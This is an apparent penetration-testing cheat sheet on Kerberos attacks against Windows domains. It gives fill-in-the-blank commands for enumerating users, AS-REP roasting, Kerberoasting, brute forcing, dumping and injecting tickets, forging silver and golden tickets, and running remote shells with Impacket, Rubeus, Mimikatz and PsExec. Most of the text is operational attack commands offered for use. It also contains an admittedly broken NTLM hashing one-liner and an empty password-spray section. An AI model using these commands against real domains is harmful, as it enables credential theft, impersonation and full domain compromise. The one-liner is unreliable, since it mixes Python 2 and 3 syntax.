# Kerberos

## Check for valid users

This is useful if you have a list of usernames and do not know which are valid on the domain.  Can also be used to find from a list of valid users which are vulnerable to the more vicious attacks below.

### Using LDAP

```text
LDAP: (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

LDAP filter for users that do not require Kerberos PREAUTH.  

### Using [Impacket](https://github.com/SecureAuthCorp/impacket) GetNPUsers.py

```bash
# $format is either hashcat or john

# check for valid users (no credentials required)
python GetNPUsers.py $domain/ -usersfile $users -format $format -outputfile $out_file

# check for users without PREAUTH required (credentials required)
python GetNPUsers.py $domain/$user:$password -request -format $format -outputfile $out_file
```

### Using [Rubeus](https://github.com/GhostPack/Rubeus) with ASREPRoast module

```bash
# $format is either hashcat or john

# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:$format /outfile:$out_file
```

## Brute Force

Attempt to validate users and/or passwords through a brute force attack.  Has a high possibility of locking out accounts.  Not recommended.

### With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)

```bash
python3 kerbrute.py -domain $domain -users $users_file -passwords $pass_file -outputfile $out_file
```

### With [Rubeus](https://github.com/Zer1t0/Rubeus) using the 'brute' module

```bash
# with a specified list of users and passwords
.\Rubeus.exe brute /users:$users_file /passwords:$pass_file /domain:$domain /outfile:$out_file

# Do a lookup for valid users and attack them
.\Rubeus.exe brute /passwords:$pass_file /outfile:$out_file
```

## Password Spray

Similar to a brute force attack, but only use one \(or a few\) passwords.  This minimizes the chances of account lockout.

```text

```

## Kerberoast

TGS Service key is derived from NTLM hash, so having one can give the other.

### Enumeration using LDAP

```text
LDAP: (&(samAccountType=805306368)(servicePrincipalName=*))
```

LDAP filter for users with linked services

### Using [Impacket](https://github.com/SecureAuthCorp/impacket) GetUserSPNs.py

```bash
python GetUserSPNs.py $domain/$user:$password -outputfile $out_file
```

### Using [Rubeus](https://github.com/GhostPack/Rubeus) with kerberoast module

```bash
.\Rubeus.exe kerberoast /outfile:$out_file>
```

* Hashcat format: `13100`
* John format: `krb5tgs`

## Overpass The Hash/Pass The Key \(PTK\)

### Using [Impacket](https://github.com/SecureAuthCorp/impacket) getTGT.py

```bash
# Request the TGT with hash (lm portion of the hash is optional)
python getTGT.py $domain/$user@$host -hashes $hash
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py $domain/$user@$host -aesKey $aes_key
# Request the TGT by supplying the password
python getTGT.py $domain/$user@$host:$password
# If the password is not provided it will be prompted for

# export the .ccache from above for use
export KRB5CCNAME=$ccache_file

# Execute remote commands with any of the following using the -k flag
python3 psexec.py $domain/$user@$host -k -no-pass
python3 smbexec.py $domain/$user@$host -k -no-pass
python3 wmiexec.py $domain/$user@$host -k -no-pass
```

### Using [Rubeus](https://github.com/GhostPack/Rubeus) with asktgt module and [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```bash
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:$domain /user:$user /rc4:$ntlm_hash /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\$host cmd
```

## Pass The Ticket

### Linux

Check type and location of tickets:

```bash
grep $ccache_name /etc/krb5.conf
```

If none return, default is `/tmp/krb5cc_%{uid}`.

For `KEYRING` tickets, you can use [tickey](https://github.com/TarlogicSecurity/tickey) to retrieve them.

```bash
# Will attempt injecting into other user processes to dump current user tickets
# For maximum effect, copy tickey to a folder reachable by all users
cp tickey /tmp/tickey
/tmp/tickey -i
```

#### Using [Impacket](https://github.com/SecureAuthCorp/impacket)

```bash
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

#### Convert tickets between Linux/Windows format with [ticket\_converter.py](https://github.com/Zer1t0/ticket_converter)

```bash
# ccache (Linux), kirbi (Windows from mimi/Rubeus) 
python3 ticket_converter.py $ticket.kirbi $ticket.ccache
python3 ticket_converter.py $ticket.ccache $ticket.kirbi
```

### Windows

#### Using [Mimikatz](https://github.com/gentilkiwi/mimikatz) to export the tickets

```text
sekurlsa::tickets /export
```

#### Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```bash
kerberos::ptt $kirbi_file
```

#### Using [Rubeus](https://github.com/GhostPack/Rubeus) with dump module

```text
.\Rubeus dump
```

#### Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus) ptt module

```bash
.\Rubeus.exe ptt /ticket:$kirbi_file
```

#### Execute a command with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) after injecting the ticket

```bash
.\PsExec.exe -accepteula \\$host $command
```

## Silver ticket

Create an unlimited use ticket for a single service.  After generating a Silver ticket, follow the same instructions as above to use

### Using [Impacket](https://github.com/SecureAuthCorp/impacket) ticketer.py

```bash
# To generate the Silver Ticket with the NTLM hash
python ticketer.py -nthash $ntlm_hash -domain-sid $domain_sid -domain $domain -spn $service_spn $user

# To generate the Siver ticket with an AES key
python ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain -spn $service_spn  $user
```

### Using [Mimikatz](https://github.com/gentilkiwi/mimikatz)

```bash
# To generate the Silver Ticket with the NTLM hash
kerberos::golden /domain:$domain /sid:$domain_sid /rc4:$ntlm_hash /user:$user /service:$service_name /target:$service_machine_hostname

# To generate the Siver ticket with an AES 128 key
kerberos::golden /domain:$domain /sid:$domain_sid /aes128:$aes128_key /user:$user /service:$service_name /target:$service_machine_hostname

# To generate the Siver ticket with an AES 256 key (default by Microsoft)
kerberos::golden /domain:$domain /sid:$domain_sid /aes256:$aes256_key /user:$user /service:$service_name /target:$service_machine_hostname
```

## Golden ticket

Create a unlimited use ticket.  It will be valid until the krbtgt password is changed or TGT expires. Tickets must be used right after created.  Follow the same instructions as above to use.

### Using [Impacket](https://github.com/SecureAuthCorp/impacket) ticketer.py

```bash
# To generate the Golden Ticket with the NTLM hash
python ticketer.py -nthash $ntlm_hash -domain-sid $domain_sid -domain $domain $user_name

# To generate the Golden ticket with an AES key
python ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain $user
```

### Using [Mimikatz](https://github.com/gentilkiwi/mimikatz)

```bash
# To generate the Golden Ticket with the NTLM hash
kerberos::golden /domain:$domain /sid:$domain_sid /rc4:$ntlm_hash /user:$user

# To generate the Golden ticket with an AES 128 key
kerberos::golden /domain:$domain /sid:$domain_sid /aes128:$aes128_key /user:$user

# To generate the Golden ticket with an AES 256 key (default by Microsoft)
kerberos::golden /domain:$domain /sid:$domain_sid /aes256:$aes256_key /user:$user
```

## Misc

### Get NTLM hash from password

```python
python3 -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", f"{password}".encode("utf-16le")).digest())'
```

The format string portion may need to be fixed.  This was to show that `{password}` is where the password is inserted.

### Other Tools

* ~~Deprecated~~

### Delegation

> Allows a service impersonate the user to interact with a second service, with the privileges and permissions of the user
>
> * If a user has delegation capabilities, all its services \(and processes\) have delegation capabilities.
> * KDC only worries about the user who is talking to, not the process.
> * Any process belonging to the same user can perform the same actions in Kerberos, regardless of whether it is a service or not.
> * Unable to delegate if  NotDelegated \(or ADS\_UF\_NOT\_DELEGATED\) flag is set in the User-Account-Control attribute of the user account or user in Protected Users group.

### Unconstrained delegation

1. User1 requests a TGS for $Service, of User2.
2. The KDC checks if User2 has the TrustedForDelegation flag set.
3. The KDC includes a TGT of User1 inside the TGS for $Service.
4. $Service receives the TGS with the TGT of User1 included and stores it for later use.

